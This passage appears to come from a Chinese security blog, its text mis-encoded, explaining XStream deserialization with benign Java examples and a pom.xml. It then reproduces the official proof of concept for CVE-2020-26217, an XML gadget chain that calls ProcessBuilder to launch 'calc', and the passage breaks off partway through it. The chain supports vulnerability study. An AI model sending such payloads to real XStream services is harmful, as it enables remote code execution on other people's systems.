title="ä¸‰ã€æ¼æ´æ¡ˆä¾‹"></a>ä¸‰ã€æ¼æ´æ¡ˆä¾‹</h2><h3 id="XStreamååºåˆ—åŒ–"><a href="#XStreamååºåˆ—åŒ–" class="headerlink" title="XStreamååºåˆ—åŒ–"></a>XStreamååºåˆ—åŒ–</h3><p>XStream æ˜¯ä¸€ä¸ªç®€å•çš„åŸºäº Java çš„ç±»åº“ï¼Œç”¨æ¥å°† Java å¯¹è±¡åºåˆ—åŒ–æˆ XMLï¼ˆJSONï¼‰æˆ–ååºåˆ—åŒ–ä¸ºå¯¹è±¡ã€‚</p><p>XStream ååºåˆ—åŒ–æ¼æ´çš„å…·ä½“åŸå› å¦‚ä¸‹ï¼š</p><ul><li><p>é»˜è®¤æ”¯æŒä»»æ„ç±»çš„ååºåˆ—åŒ–ï¼šXStream çš„é»˜è®¤é…ç½®å…è®¸å°†ä»»æ„ç±»è¿›è¡Œååºåˆ—åŒ–ï¼Œè€Œä¸ä»…ä»…é™äºé¢„æœŸçš„ç±»ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹åˆ¶çš„XMLæ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç æˆ–æ¶æ„ç±»çš„å¼•ç”¨ã€‚</p></li><li><p>ç±»åŠ è½½å™¨çš„é—®é¢˜ï¼šXStream åœ¨ååºåˆ—åŒ–æ—¶ä¼šä½¿ç”¨å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ç±»åŠ è½½å™¨æˆ–æä¾›æ¶æ„çš„ç±»åŠ è½½å™¨ï¼Œå°±å¯ä»¥åŠ è½½å’Œæ‰§è¡Œæ¶æ„ç±»ã€‚</p></li><li><p>é»˜è®¤å®‰å…¨å¿½ç•¥ç­–ç•¥ï¼šXStream é»˜è®¤æƒ…å†µä¸‹ä¼šå¿½ç•¥ä¸€äº›æ•æ„Ÿçš„ Java ç±»ï¼Œå¦‚ java.lang.Runtimeã€java.lang.ProcessBuilder ç­‰ã€‚ç„¶è€Œï¼Œè¿™ä¸ªé»˜è®¤çš„å®‰å…¨å¿½ç•¥ç­–ç•¥å¯èƒ½ä¸å¤Ÿä¸¥æ ¼ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚</p></li></ul><blockquote><p>å½±å“èŒƒå›´</p></blockquote><p>åœ¨1.4.x ç³»åˆ—ç‰ˆæœ¬ä¸­ï¼Œ&lt;&#x3D;1.4.6 æˆ– &#x3D; 1.4.10 å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p><blockquote><p>XStream çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</p></blockquote><p>XStream çš„åºåˆ—åŒ–ä¸ååºåˆ—ä¸ Java åŸç”Ÿçš„åºåˆ—åŒ–ååºåˆ—åŒ–æœºåˆ¶å­˜åœ¨å·®å¼‚ï¼ŒXStream ä½¿ç”¨çš„æ˜¯ç‹¬ç«‹çš„ä¸€å¥—æœºåˆ¶ï¼Œä¸»è¦æ ¸å¿ƒæ˜¯é€šè¿‡ Converter è½¬æ¢å™¨æ¥å°† XML å’Œå¯¹è±¡ä¹‹é—´è¿›è¡Œç›¸äº’çš„è½¬æ¢ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ï¼š<code>å°†ç‰¹å®šç±»å‹çš„å¯¹è±¡è½¬æ¢ä¸º XML æˆ–è€…å°† XML è½¬æ¢ä¸ºç‰¹å®šç±»å‹çš„å¯¹è±¡</code>ï¼Œå…·ä½“éœ€è¦å…ˆå®ç°ä»¥ä¸‹3ä¸ªæ–¹æ³•ï¼š</p><ul><li><p>canConvert æ–¹æ³•ï¼šå‘Šè¯‰ XStream å¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</p></li><li><p>marshal æ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</p></li><li><p>unmarshal æ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</p></li></ul><p>å…·ä½“å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a> ï¼Œä¸‹å›¾ä¸ºè½¬æ¢çš„ç±»å‹æ ¼å¼</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817152242552.png" data-caption="image-20230817152242552"><img src="/../images/Java/deserialization/image-20230817152242552.png" alt="image-20230817152242552"></a></p><p>ä¾‹å­ï¼šä½¿ç”¨äº† <code>xstream.toXML()</code> æ–¹æ³•å°† <code>person</code> ç±»çš„å¯¹è±¡å­—ç¬¦ä¸²åºåˆ—åŒ–ä¸º <code>xml</code> æ ¼å¼</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//åˆ›å»º XStream å®ä¾‹</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ª Person å¯¹è±¡</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†å¯¹è±¡åºåˆ—åŒ–ä¸º XML å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ Person ç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person ç±»çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214904136.png" data-caption="image-20230813214904136"><img src="/../images/Java/deserialization/image-20230813214904136.png" alt="image-20230813214904136"></a></p><p>ååºåˆ—åŒ–åˆ™ä½¿ç”¨äº† <code>xstream.fromXML()</code> æ–¹æ³•å°†å·²ç»åºåˆ—åŒ–çš„<code>xml</code>ååºåˆ—åŒ–ä¸ºå­—ç¬¦</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é…ç½®ç±»åçš„åˆ«å,ä»¥ä¾¿ä¸‹é¢çš„ xml ä¸­çš„ &lt;person&gt; èƒ½è¢«è¯»å–</span></span><br><span class="line">        xstream.alias(<span class="string">&quot;person&quot;</span>, Person.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®šä¹‰è¦ååºåˆ—åŒ–çš„ XML å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;person&gt;&lt;name&gt;John&lt;/name&gt;&lt;age&gt;30&lt;/age&gt;&lt;/person&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä» XML ååºåˆ—åŒ–ä¸º Person å¯¹è±¡</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°ååºåˆ—åŒ–åçš„ Person å¯¹è±¡</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + person.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ Person ç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– name å±æ€§çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– age å±æ€§çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214805534.png" data-caption="image-20230813214805534"><img src="/../images/Java/deserialization/image-20230813214805534.png" alt="image-20230813214805534"></a></p><p>å®Œæ•´çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œç¨‹åºå…ˆå°†å­—ç¬¦ä¸²åºåˆ—åŒ–ä¸º <code>xml</code> æ ¼å¼ï¼Œç„¶åå†å°†å·²ç»ä¸º <code>xml</code> æ ¼å¼ååºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ Person ç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person ç±»çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åœ¨ Person ç±»ä¸­å®šä¹‰ getter å’Œ setter æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// è¿™äº›æ–¹æ³•ç”¨äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶è®¿é—®å±æ€§</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//åˆ›å»º XStream å®ä¾‹</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ª Person å¯¹è±¡</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†å¯¹è±¡åºåˆ—åŒ–ä¸º XML å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized XML:&quot;</span>);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°† XML å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line">        System.out.println(<span class="string">&quot;\nDeserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813215458252.png" data-caption="image-20230813215458252"><img src="/../images/Java/deserialization/image-20230813215458252.png" alt="image-20230813215458252"></a></p><blockquote><p>ä¸Šè¿°æ¡ˆä¾‹ Pom.xml å¦‚ä¸‹</p></blockquote><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-example<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h4><blockquote><p>å®˜æ–¹æ¼æ´é€šå‘Š</p></blockquote><p><code>https://x-stream.github.io/CVE-2020-26217.html</code> ï¼Œ XStream ä»£ç ä¸­å¯ç›´æ¥åˆ©ç”¨ç”¨æˆ·æ§åˆ¶çš„è¯·æ±‚è¾“å…¥çš„ xml æ•°æ®ä½œä¸º fromXML çš„å‚æ•°ä½¿ç”¨ï¼Œè¿™é‡Œè¾“å…¥å¯èƒ½æ˜¯è¾“å…¥æµã€æ–‡ä»¶ã€postå‚æ•°ç­‰ï¼Œå¹¶ä¸”ç¨‹åºä¸­æ²¡æœ‰è®¾ç½®å…è®¸ååºåˆ—åŒ–ç±»çš„ç™½åå•ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´ç‰ˆæœ¬ä¸º <code>1.4.13</code>ã€‚</p><p>å®˜æ–¹ Poc</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span 